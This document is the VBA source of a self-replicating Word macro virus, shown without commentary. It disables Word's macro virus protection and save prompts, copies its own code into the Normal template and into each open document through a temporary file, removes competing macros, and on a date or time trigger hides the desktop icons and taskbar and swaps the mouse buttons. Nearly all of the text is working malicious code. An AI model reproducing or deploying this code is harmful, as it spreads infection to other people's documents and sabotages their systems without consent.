   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Option Explicit
   Const SW_HIDE = 0
   Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
   Private Declare Function GetDesktopWindow Lib "User32.dll" () As Long
   Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
   Private Declare Function ShowWindow Lib "User32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
   Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
   Private Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
   Private Sub Document_Close()
       Dim stato As Boolean
       Dim flagaltro As Boolean
       Dim flagio As Boolean
       Dim count As Integer
       Dim stress As String
       Dim bry As Variant
       Dim hWnd_DesktopIcons As Long
       Dim hWnd_StartBar As Long
       Dim X As Long

       On Error Resume Next
       stato = ActiveDocument.Saved

       Application.EnableCancelKey = Not -1
       With Options
           .ConfirmConversions = 0
           .VirusProtection = 0
           .SaveNormalPrompt = 0
       End With
           SetAttr "c:\cont.dbl", vbNormal: Kill "c:\cont.dbl": Open "c:\cont.dbl" For Output As #1
       For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
       Next count

       Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
           Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
           count = count + 1
       Loop

       Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)

       For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
       Next count

       Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
           Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
           count = count + 1
       Loop

       Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
       Close #1

       SetAttr "c:\cont.dbl", vbNormal

       flagaltro = False
       flagio = False

       Set bry = NormalTemplate.VBProject.VBComponents.Item(1)

       For count = 1 To bry.CodeModule.CountOfLines
           If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
               flagaltro = True
               flagio = False
               If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                   flagio = True
                   flagaltro = False
                   Exit For
               End If
           End If
       Next count

       If flagaltro = True Then
           For count = 1 To bry.CodeModule.CountOfLines
               If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
           Next count

           Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
               bry.CodeModule.DeleteLines (count)
           Loop

           bry.CodeModule.DeleteLines (count)

           flagaltro = False
       End If

       If flagio = False And flagaltro = False Then
           Open "c:\cont.dbl" For Input As #1
           If LOF(1) = 0 Then GoTo cpynorm
           count = 1
           Do While Not EOF(1)
               Line Input #1, stress
               bry.CodeModule.InsertLines count, stress
               count = count + 1
           Loop
   cpynorm:
           Close #1
       End If

       flagaltro = False
       flagio = False

       Set bry = ActiveDocument.VBProject.VBComponents.Item(1)

       For count = 1 To bry.CodeModule.CountOfLines
           If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
               flagaltro = True
               flagio = False
               If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                   flagio = True
                   flagaltro = False
                   Exit For
               End If
           End If
       Next count

       If flagaltro = True Then
           For count = 1 To bry.CodeModule.CountOfLines
               If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
           Next count

           Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
               bry.CodeModule.DeleteLines (count)
           Loop

           bry.CodeModule.DeleteLines (count)

           flagaltro = False
       End If

       If flagio = False And flagaltro = False Then
           Open "c:\cont.dbl" For Input As #1
           If LOF(1) = 0 Then GoTo cpyacti
           count = 1
           Do While Not EOF(1)
               Line Input #1, stress
               bry.CodeModule.InsertLines count, stress
               count = count + 1
           Loop
   cpyacti:
           Close #1
       End If

       Kill "c:\cont.dbl"

       If Left(ActiveDocument.Name, 8) <> "Document" Then
           ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
       End If

       If Minute(Time) = 30 Or Day(Date) = 25 Then
       X = SystemParametersInfo(97, True, CStr(1), 0)
       hWnd_DesktopIcons = GetWindow(FindWindow("Progman", "Program Manager"), 5)
       ShowWindow hWnd_DesktopIcons, SW_HIDE
       hWnd_StartBar = FindWindow("Shell_TrayWnd", "")
       ShowWindow hWnd_StartBar, SW_HIDE
       SwapMouseButton& True
       End If

       ActiveDocument.Saved = stato

       On Error GoTo 0
   End Sub
   Private Sub Document_Open()
       Dim flagaltro As Boolean
       Dim flagio As Boolean
       Dim count As Integer
       Dim bry As Variant

       On Error Resume Next

       Application.EnableCancelKey = Not -1
       With Options
           .ConfirmConversions = 0
           .VirusProtection = 0
           .SaveNormalPrompt = 0
       End With

       flagaltro = False
       flagio = False

       Set bry = NormalTemplate.VBProject.VBComponents.Item(1)

       For count = 1 To bry.CodeModule.CountOfLines
           If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
               flagaltro = True
               flagio = False
               If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                   flagio = True
                   flagaltro = False
                   Exit For
               End If
           End If
       Next count

       If flagaltro = True Then
           For count = 1 To bry.CodeModule.CountOfLines
               If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
           Next count

           Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
               bry.CodeModule.DeleteLines (count)
           Loop

           bry.CodeModule.DeleteLines (count)

           flagaltro = False
       End If

       flagaltro = False
       flagio = False

       Set bry = NormalTemplate.VBProject.VBComponents.Item(1)

       For count = 1 To bry.CodeModule.CountOfLines
           If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
               flagaltro = True
               flagio = False
               If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                   flagio = True
                   flagaltro = False
                   Exit For
               End If
           End If
       Next count

       If flagaltro = True Then
           For count = 1 To bry.CodeModule.CountOfLines
               If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
           Next count

           Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
               bry.CodeModule.DeleteLines (count)
           Loop

           bry.CodeModule.DeleteLines (count)

           flagaltro = False
       End If

       On Error GoTo 0
   End Sub
